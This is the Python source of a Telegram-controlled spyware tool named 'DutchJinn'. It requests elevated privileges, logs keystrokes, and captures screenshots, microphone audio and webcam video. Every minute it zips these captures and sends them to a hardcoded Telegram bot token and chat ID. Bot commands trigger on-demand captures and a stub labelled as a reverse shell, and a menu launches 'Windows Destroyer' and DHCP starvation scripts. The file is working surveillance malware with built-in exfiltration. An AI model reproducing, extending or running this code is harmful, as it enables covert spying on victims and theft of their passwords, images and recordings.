import logging
import subprocess
import os
import datetime
import requests
import threading
import time
import zipfile
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from pynput.keyboard import Key, Listener
import pyaudio
import wave
import cv2
import pyautogui
import sys
import signal
import mutagen
from mutagen.mp3 import MP3
from mutagen.mp4 import MP4
from mutagen.oggvorbis import OggVorbis
from mutagen.flac import FLAC

from elevate import elevate

elevate()

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Signal handler function
def signal_handler(sig, frame):
    print('Exiting...')
    # Add cleanup code here if needed
    sys.exit(0)

# Register signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Constants and Global Variables
TOKEN = "6672103339:AAHQrAHVnH32XU-0-EOVhWaE0gKyMWLr2Mo"
CHAT_ID = "5517521840"
SEND_INTERVAL = 60  # Interval for periodic tasks

send_interval = 60  # Time interval in seconds (2 minutes)
batch_time = 5  # Time interval in seconds to batch keystrokes
file_path = 'keystrokes.txt'  # Path to save the keystrokes

# File paths
KEYSTROKES_FILE_PATH = 'keystrokes.txt'
SCREENSHOT_FILE_PATH = 'screenshot.png'
AUDIO_FILE_PATH = "audio_record.wav"
VIDEO_FILE_PATH = "video_capture.avi"

# Function to send a message to Telegram
def send_message_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        response = requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
        logging.debug(f"Sent message to Telegram: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending message to Telegram: {e}")


def send_data_to_telegram(file_path, is_photo=False, is_audio=False, is_video=False):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    files = {'document': open(file_path, 'rb')}

    if is_photo:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        files = {'photo': open(file_path, 'rb')}
    elif is_audio:
        url = f"https://api.telegram.org/bot{TOKEN}/sendAudio"
        files = {'audio': open(file_path, 'rb')}
    elif is_video:
        url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
        files = {'video': open(file_path, 'rb')}
        
    try:
        response = requests.post(url, files=files, data={'chat_id': CHAT_ID})
        logging.debug(f"Sent {file_path} to Telegram: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending {file_path} to Telegram: {e}")

def record_audio(output_filename, duration=5):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

    print("Recording...")

    frames = []

    for i in range(0, int(RATE / CHUNK * duration)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("Finished recording.")

    stream.stop_stream()
    stream.close()
    audio.terminate()

    wf = wave.open(output_filename, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

    # Set duration metadata for the audio file
    set_audio_duration_metadata(output_filename, duration)

def set_audio_duration_metadata(file_path, duration):
    try:
        if file_path.endswith('.mp3'):
            audio = MP3(file_path)
            audio.info.length = duration
            audio.save()
        elif file_path.endswith('.wav'):
            audio = mutagen.File(file_path)
            audio.info.length = duration
            audio.save()
        elif file_path.endswith('.ogg'):
            audio = OggVorbis(file_path)
            audio.info.length = duration
            audio.save()
        elif file_path.endswith('.flac'):
            audio = FLAC(file_path)
            audio.info.length = duration
            audio.save()
        elif file_path.endswith('.m4a'):
            audio = MP4(file_path)
            audio.info.length = duration
            audio.save()
        else:
            print("Unsupported audio format.")
    except Exception as e:
        print(f"Error setting audio duration metadata: {e}")

def capture_video(duration=5, output_filename="video_capture.avi"):
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(output_filename, fourcc, 20.0, (640, 480))
    start_time = time.time()
    while int(time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
    cap.release()
    out.release()

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save(SCREENSHOT_FILE_PATH)

# Initialize the buffer for captured keystrokes and the last timestamp

def send_file_to_telegram(file_path):
    """Sends the file with keystrokes to Telegram chat."""
    try:
        url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': CHAT_ID}
            response = requests.post(url, files=files, data=data)
            print("File sent to Telegram." if response.status_code == 200 else f"Failed to send file: {response.text}")
    except Exception as e:
        print(f"Error sending file to Telegram: {e}")
        
keystrokes = []
last_keystroke_time = datetime.datetime.now()

def write_keystrokes_to_file(batch):
    """Appends the batched keystrokes to a file."""
    try:
        with open(file_path, 'a') as file:
            file.write(f"{batch}\n")
    except IOError as e:
        print(f"Failed to write to file: {e}")
        
# Define the function to handle keystrokes
def on_press(key):
    """Triggered when a key is pressed. Batches alphanumeric keys."""
    global last_keystroke_time
    if key == Key.esc:
        # Exit the program
        return False
    try:
        if key == Key.enter:
            # Append a newline character to the keystrokes buffer
            keystrokes.append('\n')
        elif key.char.isalnum():  # Check if the character is alphanumeric
            now = datetime.datetime.now()
            keystrokes.append(key.char)
            # Check if the batch time has elapsed
            if (now - last_keystroke_time).seconds >= batch_time:
                timestamp = now.strftime('%Y-%m-%d %H:%M:%S')
                batch = f"{timestamp}: {''.join(keystrokes)}"
                write_keystrokes_to_file(batch)
                keystrokes.clear()  # Clear the buffer after writing
                last_keystroke_time = now
    except AttributeError:
        pass  # Non-alphanumeric keys are ignored

def handle_sending():
    """Handles the periodic task of writing and sending keystrokes."""
    # Ensure any remaining keystrokes are written and sent at the interval
    if keystrokes:
        now = datetime.datetime.now()
        timestamp = now.strftime('%Y-%m-%d %H:%M:%S')
        batch = f"{timestamp}: {''.join(keystrokes)}"
        write_keystrokes_to_file(batch)
        keystrokes.clear()
    send_file_to_telegram(file_path)
    threading.Timer(send_interval, handle_sending).start()

# Set up and start the periodic sending task
handle_sending()

# Inform the user about the script's status
print("Keylogger is running... Press ESC to quit.")


def keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def new_periodic_tasks():
    while True:
        # Ensure fresh captures
        take_screenshot()
        record_audio(AUDIO_FILE_PATH, duration=5)
        capture_video(duration=5, output_filename=VIDEO_FILE_PATH)
        
        # Create zip with all data
        zip_filename = zip_data()
        
        # Send the zip file
        send_data_to_telegram(zip_filename)
        logging.info(f"Data bundle {zip_filename} sent.")
        
        # Cleanup
        os.remove(zip_filename)  # Remove the zip file after sending
        time.sleep(SEND_INTERVAL)  # Pause before next cycle

def zip_data():
    zip_filename = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S') + '.zip'
    files_to_zip = [KEYSTROKES_FILE_PATH, SCREENSHOT_FILE_PATH, AUDIO_FILE_PATH, VIDEO_FILE_PATH]
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in files_to_zip:
            if os.path.exists(file):
                zipf.write(file, arcname=os.path.basename(file))
    return zip_filename

# Function Definitions
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Bot started!')
    send_message_to_telegram("DutchJinn Initializing BOT")

def stop(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Bot stopped!')

def status(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Bot is running!')

def shell(update: Update, context: CallbackContext) -> None:
    """Go into reversed shell"""
    cmd = ['cmd']
    subprocess.Popen(cmd)

# Define the screenshot command function
def screenshot_command(update: Update, context: CallbackContext) -> None:
    """Take a screenshot and send it to the user."""
    take_screenshot()
    send_data_to_telegram(SCREENSHOT_FILE_PATH, is_photo=True)
    
def audio_command(update: Update, context: CallbackContext) -> None:
    """Send the audio file to the user."""
    record_audio(duration=5, output_filename=AUDIO_FILE_PATH)
    send_data_to_telegram(AUDIO_FILE_PATH, is_audio=True)

def video_command(update: Update, context: CallbackContext) -> None:
    """Send the video file to the user."""
    capture_video(duration=5, output_filename=VIDEO_FILE_PATH)
    send_data_to_telegram(VIDEO_FILE_PATH, is_video=True)
    

def info(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('This is a bot. You can use /start, /stop, /status, /info, /shell, /screenshot, /audio, /video commands.')
    
    
def main():
    global start_telegram_bot_flag

    print("Welcome! Please choose an action:")
    print("1. Run Windows Destroyer")
    print("2. Run Telegram Bot")
    print("3. Run DHCP Starvation")

    choice = input("Enter your choice (1/2/3): ")

    if choice == "1":
        print("Running Windows Destroyer...")
        subprocess.Popen(["python", "windows-destroyer.py"])
    elif choice == "2":
        print("Starting Telegram Bot...")
        start_telegram_bot_flag = True
        if start_telegram_bot_flag:
            start_telegram_bot()
    elif choice == "3":
        print("Running DHCP Starvation...")
        subprocess.Popen(["python", "dhcp-starvation.py"])
    else:
        print("Invalid choice. Please enter 1, 2, or 3.")


def start_telegram_bot():
    # Start keylogger and periodic tasks within the Telegram bot startup logic
    threading.Thread(target=new_periodic_tasks, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()

    updater = Updater(TOKEN)
    dp = updater.dispatcher

    # Register command handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop))
    dp.add_handler(CommandHandler("status", status))
    dp.add_handler(CommandHandler("info", info))
    dp.add_handler(CommandHandler("shell", shell))
    dp.add_handler(CommandHandler("screenshot", screenshot_command))
    dp.add_handler(CommandHandler("audio", audio_command))
    dp.add_handler(CommandHandler("video", video_command))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()